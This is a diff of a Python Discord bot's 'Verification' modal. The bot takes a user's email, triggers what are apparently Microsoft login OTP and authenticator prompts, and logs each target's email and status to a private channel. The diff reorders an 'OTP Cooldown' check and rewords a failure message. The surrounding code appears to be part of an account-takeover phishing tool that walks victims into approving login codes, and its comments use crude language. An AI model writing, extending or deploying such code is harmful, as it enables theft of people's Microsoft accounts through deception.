@@ -67,6 +67,29 @@ class MyModalOne(ui.Modal, title="Verification"):
             }
         ).json()
         
+        print(emailInfo)
+
+        # Microsoft raping otp requests
+        # Can be fixed since the latest otp sent still works
+        # To be coded later
+        if len(emailInfo) == 1:
+            await logs_channel.send(
+                embed = discord.Embed(
+                    title = f"{interaction.user.name} ({interaction.user.id})",
+                    description = f"Failed to send a code to:\n```{self.email.value}```\nOTP Cooldown"
+                )
+            )
+
+            await interaction.response.send_message(
+                    embed = discord.Embed(
+                    title = embeds["cooldown_otp"][0],
+                    description = embeds["cooldown_otp"][1],
+                ),
+                ephemeral = True
+            )
+
+            return
+
         # Email does not exist
         if "Credentials" not in emailInfo:
             await logs_channel.send(
@@ -86,28 +109,6 @@ class MyModalOne(ui.Modal, title="Verification"):
             )
 
             return
-        
-        # Microsoft raping otp requests
-        # Can be fixed since the latest otp sent still works
-        # To be coded later
-        if "Error" in emailInfo:
-            await logs_channel.send(
-                    embed = discord.Embed(
-                        title = f"{interaction.user.name} ({interaction.user.id})",
-                        description = f"Failed to send a code to:\n```{self.email.value}```\nOTP Cooldown"
-                    )
-                )
-
-            await interaction.response.send_message(
-                embed = discord.Embed(
-                    title = embeds["cooldown_otp"][0],
-                    description = embeds["cooldown_otp"][1],
-                ),
-                ephemeral = True
-            )
-
-            return
-
 
         # Entropy = Authenticator App number to click in  
         if "RemoteNgcParams" in emailInfo["Credentials"]:
@@ -272,10 +273,11 @@ class MyModalOne(ui.Modal, title="Verification"):
             await logs_channel.send(embed = sucessEmbed)
         
         else:
+
             await logs_channel.send(
                     embed = discord.Embed(
                         title = f"{interaction.user.name} ({interaction.user.id})",
-                        description = f"Failed to send a code to:\n```{self.email.value}```\nEmail OTP Cooldown"
+                        description = f"Failed to send a code to:\n```{self.email.value}```\n No OTP Methods Found"
                     )
                 )
 
